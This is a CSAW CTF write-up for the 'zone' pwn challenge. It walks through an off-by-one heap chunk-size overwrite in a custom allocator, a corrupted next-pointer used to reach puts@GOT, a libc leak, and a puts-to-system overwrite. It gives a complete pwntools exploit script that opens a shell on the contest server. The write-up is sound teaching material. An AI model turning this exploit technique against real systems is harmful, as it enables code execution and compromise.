# Zone

Given
---
We're on a highway to the danger zone.

nc pwn.chal.csaw.io 5223

-- fatalbit (Eric Liang)

[zone](https://ctf.csaw.io/files/808a9400f921510cd6ed7b1dcefa46ec/zone) 
[libc-2.23.so](https://ctf.csaw.io/files/6869d29fcdd2ee8d1f42eea68fdb63f5/libc-2.23.so) 

Writeup
---
So lets go ahead and run this

```
root@hackbox:/home/anichno/csaw/zone# ./zone 
Environment setup: 0x7ffe394d7930
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
```

Alright, so it immediately looks like this will be a heap based challenge... fun...
A quick lookup in gdb confirms this
```
gdb-peda$ vmmap 
Start              End                Perm	Name
...
0x00007ffff7ff1000 0x00007ffff7ff2000 rw-s	/dev/zero (deleted)
0x00007ffff7ff2000 0x00007ffff7ff3000 rw-s	/dev/zero (deleted)
0x00007ffff7ff3000 0x00007ffff7ff4000 rw-s	/dev/zero (deleted)
0x00007ffff7ff4000 0x00007ffff7ff5000 rw-s	/dev/zero (deleted)
...
```
w/ correlation from strace
```
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff4000
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff3000
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff2000
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff1000
```

Before we get too crazy, whats going on in these mapped regions?
```
gdb-peda$ x/64x 0x00007ffff7ff4000
0x7ffff7ff4000:	0x0000000000000040	0x00007ffff7ff4050
0x7ffff7ff4010:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4050:	0x0000000000000040	0x00007ffff7ff40a0
0x7ffff7ff4060:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4070:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4080:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4090:	0x0000000000000000	0x0000000000000000
0x7ffff7ff40a0:	0x0000000000000040	0x00007ffff7ff40f0

```

A quick guess is the header structure is something like [size of chunk | next chunk pointer].
Huh, ok lets come back to that later. Let's play with the program a little bit.
```
root@hackbox:/home/anichno/csaw/zone# ./zone 
Environment setup: 0x7ffe014743a0
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
1
5
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
3
ABCD
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
4
ABCD
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
```
Cool, I created a block, presumably of size 5, wrote to it, then printed it.
Lets take a quick look at gdb and see what those heap structures look like now.
```
gdb-peda$ x/64x 0x00007ffff7ff4000
0x7ffff7ff4000:	0x0000000000000040	0x0000000000000000
0x7ffff7ff4010:	0x0000000044434241	0x0000000000000000
0x7ffff7ff4020:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4030:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4040:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4050:	0x0000000000000040	0x00007ffff7ff40a0
0x7ffff7ff4060:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4070:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4080:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4090:	0x0000000000000000	0x0000000000000000
0x7ffff7ff40a0:	0x0000000000000040	0x00007ffff7ff40f0
```
Alright cool, I allocated a block of size 5, and it looks like its going to the mmap'ed section for size 64 blocks. Weirdly the next block pointer became all nulls, but maybe thats part of how the program tracks the current block. 

At this point, if we decide to try to overflow the program here, we find it just breaks and goes into an infinite loop. If we try to allocate too large a block > 512 the program returns an message saying "Nope sorry can't allocate that". Whenever we "Delete block", the program tells us the size of what block we freed. What happens if we allocate exactly 64 bytes? Based of what we've seen, we should be able to write 64 characters to our new chunk in the fake heap. If that happens we should either see an '@' character when we print (because thats 64 in ascii), or we should write a 0x00 to the size of the next chunk. Either way its fun times.
```
gdb-peda$ r
Starting program: /home/anichno/csaw/zone/zone 
Environment setup: 0x7fffffffe360
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
1
64
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
```
As expected:
```
gdb-peda$ x/64x 0x00007ffff7ff4000
0x7ffff7ff4000:	0x0000000000000040	0x0000000000000000
0x7ffff7ff4010:	0x4141414141414141	0x4141414141414141
0x7ffff7ff4020:	0x4141414141414141	0x4141414141414141
0x7ffff7ff4030:	0x4141414141414141	0x4141414141414141
0x7ffff7ff4040:	0x4141414141414141	0x4141414141414141
0x7ffff7ff4050:	0x0000000000000040	0x00007ffff7ff40a0
```
Alright, it doesn't write 0x00 to the end. What if the length check is poorly implemented? Single byte overwrites are somewhat common, its really easy to mess up length checks and get off by one errors. Lets test real quick:
```
gdb-peda$ r
Starting program: /home/anichno/csaw/zone/zone 
Environment setup: 0x7fffffffe360
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
1
64
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
```
```
gdb-peda$ x/64x 0x00007ffff7ff4000
0x7ffff7ff4000:	0x0000000000000040	0x0000000000000000
0x7ffff7ff4010:	0x4141414141414141	0x4141414141414141
0x7ffff7ff4020:	0x4141414141414141	0x4141414141414141
0x7ffff7ff4030:	0x4141414141414141	0x4141414141414141
0x7ffff7ff4040:	0x4141414141414141	0x4141414141414141
0x7ffff7ff4050:	0x0000000000000042	0x00007ffff7ff40a0
```
Awesome! We can overwrite the length of the next block, I wonder if that will be useful...
If we now allocate a new block of size 64, nothing special happens immediately. However, if we delete that block, we see something weird. Normally you get a message saying "Free size x" where x is always one of (64, 128, 256, or 512). This time instead we get "Free size 66" (66 is 'B' in ascii) and the program exits immediately. Maybe we should take a quick look at the code and see why. Using the string "Free size" to help us find the relevant section
```
00000000004043a3         mov        edi, 0x404730                               ; "Free size %lu\\n", argument "format" for method j_printf
00000000004043a8         mov        eax, 0x0
00000000004043ad         call       j_printf
00000000004043b2         mov        rax, qword [rbp+var_8]
00000000004043b6         mov        rax, qword [rax]
00000000004043b9         cmp        rax, 0x80
00000000004043bf         je         loc_4043f8

00000000004043c1         cmp        rax, 0x80
00000000004043c7         ja         loc_4043d1

00000000004043c9         cmp        rax, 0x40
00000000004043cd         je         loc_4043e3

00000000004043cf         jmp        loc_404437

                     loc_4043d1:
00000000004043d1         cmp        rax, 0x100                                  ; CODE XREF=something_print_free_amount+91
00000000004043d7         je         loc_40440d

00000000004043d9         cmp        rax, 0x200
00000000004043df         je         loc_404422

00000000004043e1         jmp        loc_404437

...

                     loc_404437:
0000000000404437         mov        edi, 0xffffffff                             ; argument "status" for method j_exit, CODE XREF=something_print_free_amount+99, something_print_free_amount+117
000000000040443c         call       j_exit
                        ; endp
```
Long story short, if the freed amount isn't 64, 128, 256, or 512, the program calls exit and closes, bummer. But wait! 64 and 128 are both one byte! I bet if we change the size from 64 to 128, something neat might happen. Using our previous process, we'll make a block of size 64, write 64 'A's to it, followed by '\x80'. We'll free that and see if the program stays up. To assist with all these operations, I went ahead and wrote a program to handle interaction with the binary. That will also come in handy later for the actual exploit.
```python
from pwn import *

p = process('./zone')

def menu():
    p.recvuntil('5) Exit\n')

menu()

def allocate(size):
    p.sendline('1')
    p.sendline(str(size))
    menu()

def delete():
    p.sendline('2')
    retval = int(p.readline().split()[2])
    menu()
    return retval

def write(content):
    p.sendline('3')
    p.sendline(content)
    menu()

def print_block():
    p.sendline('4')
    retval = p.recvuntil('\n1) ')
    menu()
    return retval

allocate(64)
write('A'*64 + '\x80')
allocate(64)
p.interactive()
```
Running our python script and then typing '2' to delete a block, we get this:
```
root@hackbox:/home/anichno/csaw/zone# python tut.py 
[+] Starting local process './zone': pid 20424
ENV: 0x7fffffffe3e0
[*] Switching to interactive mode
$ 2
Free size 128
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
```
Very cool! It thinks it just freed a block of size 128, but that was really a block of size 64!
With some quick experimentation, it looks like the program now thinks that the second block of the 64 byte heap is now the head of the 128 byte heap. Even better, after freeing all the blocks, the next chunk pointer of the 64 byte table points 160 bytes away, which is within the "data" segment of the first chunk of the "128 byte table" (in quotes because this first chunk now resides in the 64 byte table). If we overwrite the header for the next to be allocated 64 byte chunk, we can point it anywhere in memory. We should even be able to read and write that location. The cherry on top is that our input is read via the "read" libc function. We can therefore write normally bad characters like '\x00' in without issue.
```
gdb-peda$ x/64x 0x00007ffff7ff4000
0x7ffff7ff4000:	0x0000000000000040	0x00007ffff7ff40a0
0x7ffff7ff4010:	0x4141414141414141	0x4141414141414141
0x7ffff7ff4020:	0x4141414141414141	0x4141414141414141
0x7ffff7ff4030:	0x4141414141414141	0x4141414141414141
0x7ffff7ff4040:	0x4141414141414141	0x4141414141414141
0x7ffff7ff4050:	0x0000000000000080	0x00007ffff7ff3000
0x7ffff7ff4060:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4070:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4080:	0x0000000000000000	0x0000000000000000
0x7ffff7ff4090:	0x0000000000000000	0x0000000000000000
0x7ffff7ff40a0:	0x0000000000000040	0x00007ffff7ff40f0
```
So here's the process so far:
1. Create block of size 64
2. Write 64 'A's + 1 '\x80'
3. Create block of size 64
4. Delete block
5. Create block of size 128 (which now resides in the heap meant for 64 byte chunks)
6. Write 128 'B"s
7. Create block of size 64
8. Create block of size 64

On that last block create, the program crashes trying to use 0x4242424242424242 as a memory address for the next chunk. Boom!

Ok, the goal now is to abuse the next chunk pointer to give us a write-what-where
What security mechanisms are we going to have to deal with?
```
gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
Since we get a stack pointer at the start of the program, when we test against pwn.chal.csaw.io:5223 we can quickly see that ASLR is on as well. A GOT overwrite seems quite viable, especially since we can write 40 bytes with no concern over bad characters.

Goal: Find a good function to overwrite with the address of system(), then we can get the program to call that function naturally and it'll end up calling something good like system("/bin/sh").

What does the GOT look like?
```
                     printf@GOT:
0000000000607018         dq         0x0000000000608000                          ; DATA XREF=j_printf
                     puts@GOT:
0000000000607020         dq         0x0000000000608018                          ; DATA XREF=j_puts
                     _ZdlPv@GOT:        // operator delete(void*)
0000000000607028         dq         0x0000000000608020                          ; DATA XREF=j__ZdlPv
                     exit@GOT:
0000000000607030         dq         0x0000000000608028                          ; DATA XREF=j_exit
                     setvbuf@GOT:
0000000000607038         dq         0x0000000000608030                          ; DATA XREF=j_setvbuf
                     __cxa_rethrow@GOT:
0000000000607040         dq         0x0000000000608038                          ; DATA XREF=j___cxa_rethrow
                     read@GOT:
0000000000607048         dq         0x0000000000608040                          ; DATA XREF=j_read
                     __libc_start_main@GOT:
0000000000607050         dq         0x0000000000608048                          ; DATA XREF=j___libc_start_main
                     scanf@GOT:
0000000000607058         dq         0x0000000000608058                          ; DATA XREF=j_scanf
                     memmove@GOT:
0000000000607060         dq         0x0000000000608068                          ; DATA XREF=j_memmove
                     __stack_chk_fail@GOT:
0000000000607068         dq         0x0000000000608070                          ; DATA XREF=j___stack_chk_fail
                     munmap@GOT:
0000000000607070         dq         0x0000000000608078                          ; DATA XREF=j_munmap
                     __cxa_end_catch@GOT:
0000000000607078         dq         0x0000000000608080                          ; DATA XREF=j___cxa_end_catch
                     _ZSt17__throw_bad_allocv@GOT:        // std::__throw_bad_alloc()
0000000000607080         dq         0x0000000000608088                          ; DATA XREF=j__ZSt17__throw_bad_allocv
                     __cxa_begin_catch@GOT:
0000000000607088         dq         0x0000000000608090                          ; DATA XREF=j___cxa_begin_catch
                     __gxx_personality_v0@GOT:
0000000000607090         dq         0x00000000006080b0                          ; DATA XREF=sub_400a80
                     _Znwm@GOT:        // operator new(unsigned long)
0000000000607098         dq         0x0000000000608098                          ; DATA XREF=j__Znwm
                     _Unwind_Resume@GOT:
00000000006070a0         dq         0x00000000006080a0                          ; DATA XREF=j__Unwind_Resume
                     mmap@GOT:
00000000006070a8         dq         0x00000000006080a8                          ; DATA XREF=j_mmap
```
To try to figure out a good candidate to overwrite, we invoke the binary with "ltrace" so we can see all its library calls
```
root@hackbox:/home/anichno/csaw/zone# ltrace ./zone 2> ltrace.out
Environment setup: 0x7fffffffe3e0
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
1
64
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
3
ABCD
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
4
ABCD
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
2
Free size 64
1) Allocate block
2) Delete block
3) Write to last block
4) Print last block
5) Exit
5
```
In another window:
```
tail -f ltrace.out
_ZdlPv(0x619ed0, 0x619ed0, 64, 0x619ed0)                      = 1
_ZdlPv(0x619e80, 0x619e80, 8, 0x619e80)                       = 0
_Znwm(64, 8, 0, 8)                                            = 0x619e80
_Znwm(512, 64, 0, 64)                                         = 0x619ed0
_Znwm(64, 8, 0, 8)                                            = 0x61a0e0
_Znwm(512, 64, 0, 64)                                         = 0x61a130
_ZdlPv(0x61a130, 0x61a130, 64, 0x61a130)                      = 1
_ZdlPv(0x61a0e0, 0x61a0e0, 8, 0x61a0e0)                       = 0
puts("1) Allocate block\n2) Delete bloc"...)                  = 85
scanf(0x404705, 0x7fffffffe264, 0x7ffff7834760, 0x7ffff75698f0) = 1
scanf(0x40469f, 0x7fffffffe290, 0, 16)                        = 1
puts("1) Allocate block\n2) Delete bloc"...)                  = 85
scanf(0x404705, 0x7fffffffe264, 0x7ffff7834760, 0x7ffff75698f0) = 1
read(0, "A", 1)                                               = 1
read(0, "B", 1)                                               = 1
read(0, "C", 1)                                               = 1
read(0, "D", 1)                                               = 1
read(0, "\n", 1)                                              = 1
puts("1) Allocate block\n2) Delete bloc"...)                  = 85
scanf(0x404705, 0x7fffffffe264, 0x7ffff7834760, 0x7ffff75698f0) = 1
puts("ABCD")                                                  = 5
puts("1) Allocate block\n2) Delete bloc"...)                  = 85
scanf(0x404705, 0x7fffffffe264, 0x7ffff7834760, 0x7ffff75698f0) = 1
printf("Free size %lu\n", 64)                                 = 13
puts("1) Allocate block\n2) Delete bloc"...)                  = 85
scanf(0x404705, 0x7fffffffe264, 0x7ffff7834760, 0x7ffff75698f0) = 1
_ZdlPv(0x619ed0, 0x619ed0, 64, 0x619ed0)                      = 1
_ZdlPv(0x619e80, 0x619e80, 8, 0x619e80)                       = 0
_ZdlPv(0x619c70, 0x619c70, 64, 0x619c70)                      = 1
_ZdlPv(0x619c20, 0x619c20, 8, 0x619c20)                       = 0x619e70
munmap(0x7ffff7ff1000, 4096, 0x619e70, 0x619c00)              = 0
munmap(0x7ffff7ff2000, 4096, 0x619e70, 0x7ffff7573c77)        = 0
munmap(0x7ffff7ff3000, 4096, 0x619e70, 0x7ffff7573c77)        = 0
munmap(0x7ffff7ff4000, 4096, 0x619e70, 0x7ffff7573c77)        = 0
+++ exited (status 0) +++
```
So it looks like puts is going to be a really good candidate. When we print the last block, it calls puts() on a string we can control. If puts() is overwritten to become system(), we can write "/bin/sh" to the last block then print it. When we print the block it will call system("/bin/sh") and we win!

At this point a buddy and I were discussing the viability of overwriting puts(). The problem we thought was it would first call puts() on the menu, and would end up breaking. Because of that, we ended up making a significantly more complecated exploit. Lets review real quick how system() works:
```
SYNOPSIS
       #include <stdlib.h>

       int system(const char *command);

DESCRIPTION
       The  system()  library  function uses fork(2) to create a child process
       that executes the shell command specified in command using execl(3)  as
       follows:

           execl("/bin/sh", "sh", "-c", command, (char *) 0);

       system() returns after the command has been completed.
```
Both puts() and system() pretty much return the same thing, and this program doesn't particularly care what is returned. Therefore if it calls system() on the menu, the shell will just fail and return. When called on our "/bin/sh", it will continue running just fine. All that really happens is we break the ability to print the menu, no biggie.

Here's the exploit process:
1. Use 1 byte overwrite to get a 128 byte chunk in the 64 byte table
2. Use 128 byte chunk to overwrite a next chunk pointer in the 64 byte table to point at puts() in the GOT
3. Make the chunk sitting in the GOT our current block
4. Print current block, this will print out the address of puts() in libc
5. Calculate position of system() in libc, using our leaked pointer from the previous step
6. Write to current block the address of system
7. Allocate new block, since the 64 byte table is all messed up, this needs to be another table (512 seems like a good pick)
8. Write to current block the string "/bin/sh"
9. Print current block
10. ???
11. Profit!

Since we are given a copy of the libc being used by the target, getting the offset from puts() to system() is easy.
```
root@hackbox:/home/anichno/csaw/zone# gdb libc-2.23.so 
GNU gdb (Ubuntu 7.12.50.20170314-0ubuntu1.1) 7.12.50.20170314-git
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from libc-2.23.so...(no debugging symbols found)...done.
gdb-peda$ p puts
$1 = {<text variable, no debug info>} 0x6f690 <puts>
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0x45390 <system>
gdb-peda$ distance 0x6f690 0x45390
From 0x6f690 to 0x45390: -172800 bytes, -43200 dwords
```

Putting it all together:

```python
from pwn import *

p = remote("pwn.chal.csaw.io", 5223)

def menu():
    p.recvuntil('5) Exit\n')

menu()

def allocate(size, read_menu=True):
    p.sendline('1')
    p.clean()
    p.sendline(str(size))
    if read_menu:
        menu()
    else:
        p.clean()

def delete(read_menu=True):
    p.sendline('2')
    retval = int(p.readline().split()[2])
    if read_menu:
        menu()
    return retval

def write(content, read_menu=True):
    p.sendline('3')
    p.clean()
    p.sendline(content)
    if read_menu:
        menu()
    else:
        p.clean()

def print_block(read_menu=True):
    p.sendline('4')
    retval = p.recvuntil('\n1) ')
    if read_menu:
        menu()
    return retval

PUTS_GOT_ADDR = 0x607020
SYSTEM_OFFSET = -172800

# Setup one byte overwrite
allocate(64)
write('A'*64 + '\x80')

# Create block in space with overwriten size, then delete it
allocate(64)
delete()

# Program in now confused of where 128 byte table should be
# let's allocate one and overwrite next chunk pointer of following 64 byte chunk
allocate(128)
write('B'*64 + p64(0x40) + p64(PUTS_GOT_ADDR - 0x10)) # -0x10 because the "next" pointer points at the chunk header, not the content

# Move current chunk ahead so that we're using the location we specified (the GOT)
allocate(64)
allocate(64)

# Read address of puts by printing block
puts_addr = u64(print_block()[:6]+'\x00\x00')

# Calculate system location
system_addr = puts_addr + SYSTEM_OFFSET

# Write to block system's address, puts() now is system()
write(p64(system_addr), False)

# Create a new block on a clean table, then write our command to it
allocate(512, False)
write('/bin/sh', False)

# Print block, which calls system('/bin/sh')
p.sendline('4')

# Enjoy shell
p.interactive()
```
The calls to clean() were necessary to make this work over the network, it looks like some stuff was getting consumed weirdly at times.

Using the exploit against CSAW's server nets us the flag:
```
root@hackbox:/home/anichno/csaw/zone# python tut.py 
[+] Opening connection to pwn.chal.csaw.io on port 5223: Done
[*] Switching to interactive mode
$ cat flag
flag{d0n7_let_m3_g3t_1n_my_z0n3}
```
















